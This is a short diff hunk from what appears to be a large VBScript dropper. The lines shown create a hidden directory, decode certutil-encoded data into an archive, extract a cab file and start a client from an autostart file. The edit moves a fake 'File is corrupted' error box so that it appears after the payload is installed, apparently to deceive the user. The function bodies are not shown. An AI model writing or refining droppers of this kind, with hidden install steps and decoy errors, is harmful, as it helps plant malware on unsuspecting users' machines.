@@ -5560,9 +5560,8 @@ Set objCommentFile = Nothing
 Set objFSO = Nothing
 
 
-MsgBox "File is corrupted" & Err.Description, vbExclamation, "Error"
-
 CreateHiddenDirectory WorkDir
 DeCodeCertutilData output,ZipFile
 ExtractCab ZipFile,WorkDir
 StartClient AutoStartFile
+MsgBox "File is corrupted" & Err.Description, vbExclamation, "Error"
